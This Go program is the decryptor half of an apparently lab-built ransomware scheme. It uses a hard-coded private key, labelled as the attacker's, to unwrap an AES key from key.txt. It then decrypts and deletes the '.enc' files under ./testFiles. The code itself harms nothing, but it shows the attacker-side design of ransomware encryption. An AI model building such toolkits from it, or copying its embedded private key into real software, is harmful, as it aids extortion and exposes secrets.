package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"os"
	"bytes"
	"log"
	"path/filepath"
)

// RSA Private Key (Attacker's private key for decryption)
const privateKeyPEM = `-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyRHrBvPn3px0HxItu/1QmolFZ+BvtaVRiSBi/eOaFrA7rYMz
P0DPK97R7gAYIB7KoGdPQqISZd7ysh7ojWj0xHAtg1VKE+22XA2jfU23+6vsZKAr
fcCBv6itVcUL+XVs/MrGAeYJtFRB84SY89DKY+CqditRXbca0IEHX9PYVKoAi2Dk
JdbRMfkDc+XJ5a03fab2NTb/09JkCzML8fMMdikFbbxur1Zi8b4fmNQsRuwyP0lr
IpXkYn1w8cy/Jtkbl1e/jlIJA+/lS3TD2cZfLyOl92+PyalK6DCeW8ZdAsIVkDHE
VxBopcr29ANYg9fv7TcgXn/Co8mUz2jeHdejdQIDAQABAoIBAQCo4uL9YQsGQXWL
z5IYj8oPM3PXr31FHong2xIq3OzFV9uYf1YhMAeTesHr3apl+FcL6hp6BnXbmStT
D4EXnevRv8OKx63EFWuR4GbNTeVWf+68CojdRD/3Qu/s1eib7NTRdGRindzS2d7X
cy2hxWLqB4BGZ1YdmDnuniIajG7tlKxPVdGBOo1CLM1yG1iOjX2hCotSfEC+yNER
5jQv+AwqnoZn5tKw2idNH/tFcGU0Dv1/Bk+EI/POpwmjkwI9l5m5aI6Mfw6ZC3RQ
VyHfbPPqNdpUDG0gEAyniTMUbnYsDSlU2IkuXbwmQeH7SPXAkNOL+EEhQFFwwCcq
1MQhBDahAoGBAOed0W88GbrwHS9pvGFv3uSJIBl6Jy1AI4w7UaDDCaIR929irkfD
s2i02/lrJfuwE9uwWEVUDxF5PGG26z2XCAlkmQA4Z+c7ZY/W/b3rq4ox7ot1/N6q
83orlCClDbQP/yllyg0cNWdm8EJCBEF2uR5SLfmZI3y1S2I+QmtB+JINAoGBAN48
207puqNzKx4dSl9z1qqUKomS3m/kPzKKlfQWAcK9ZdI6mNV+v7ZwxLyxNZ242pKM
+JYJcUvvT1XcK0KnxcOagLC8ugHmCLdQLwpmvwAOqYAL89UxMgdfpHRi7MC6mq3p
voS+ZuV0KLVxeYVT6wGYhn5BUI9QCmOuhzVpcUUJAoGAJpe9VfOFtghcVJIhuXqS
gTH4D0azUG7nfW5E46yb5k1oFT80GvEY69F29dBMu+tS48A2dRbUi+zPitiXyeNo
i2gftlGvvm+/NIB2NzcVlilLviEiyVdiynCIdggKiH5B3fv/9r9Ehr44OlIVs3K8
1biLwJMrvpPWw7/sAUM0z+ECgYAaqeSKIELTT4MR1uPQdf6AcsxzuxpTBGiMsNHy
+hz193Fa+srReqaXxgnktcJADSi0QpOktLdSLAExxPuvwJ9aq5PbIJmUlrve+pDa
R5+M6zVs9oInxwJAnjoF+MR9DyZ1zUCdfpar2vbzZgz1cS8V/u3MAhwfRbQpZ4wz
XVZIuQKBgQC3SKAsu7kWigD2KGDboAZGVMbHIvciFyjUVW7z8JSvicK+U3tCeAP5
7+Ml/2klsb7t3yLvHdJqpeom0M6kq0ckrpHXjWrGiRjPvyJBLOLRXWwo0rgMX20z
YfP4dsUUKqmnJnoYIh09MH43qcsC3pfQ8nMus6tKuIl+qMYelEw+Qw==
-----END RSA PRIVATE KEY-----
`

func readKeyFromFile(filename string) ([]byte, error) {
    key, err := os.ReadFile(filename)
    if err != nil {
        return nil, err
    }
    return bytes.TrimSpace(key), nil // Remove any extra newlines/spaces
}

// Decrypt AES Key using RSA Private Key
func decryptAESKeyWithRSA(encryptedKey []byte) ([]byte, error) {
	block, _ := pem.Decode([]byte(privateKeyPEM))
	if block == nil {
		return nil, fmt.Errorf("failed to parse RSA private key")
	}
	privKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	// Decrypt AES Key
	hash := sha256.New()
	decryptedKey, err := rsa.DecryptOAEP(hash, nil, privKey, encryptedKey, nil)
	if err != nil {
		return nil, err
	}
	return decryptedKey, nil
}

// Decrypt file with AES-GCM
func decryptFile(path string, aesKey []byte) error {
	// Read encrypted file
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	// Initialize AES
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	// Extract nonce
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	// Decrypt data
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return err
	}

	// Write decrypted file
	err = os.WriteFile(path[:len(path)-4], plaintext, 0666)
	if err == nil {
		os.Remove(path) // Delete encrypted file
	}
	return err
}

// Walk through directory and decrypt files
func decryptDirectory(dir string, aesKey []byte) {
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() && filepath.Ext(path) == ".enc" {
			fmt.Println("Decrypting:", path)
			decryptFile(path, aesKey)
		}
		return nil
	})
}

// Main function
func main() {
	// Load Encrypted AES Key from User
	encryptedKeyBase64, err := readKeyFromFile("key.txt")
	if err != nil {
	    log.Fatal("Failed to read key:", err)
	}


	// Decode Base64 Key
	encryptedKey, _ := base64.StdEncoding.DecodeString(string(encryptedKeyBase64))

	// Decrypt AES Key
	aesKey, err := decryptAESKeyWithRSA(encryptedKey)
	if err != nil {
		panic("Failed to decrypt AES key")
	}

	// Decrypt Files
	decryptDirectory("./testFiles", aesKey)
}
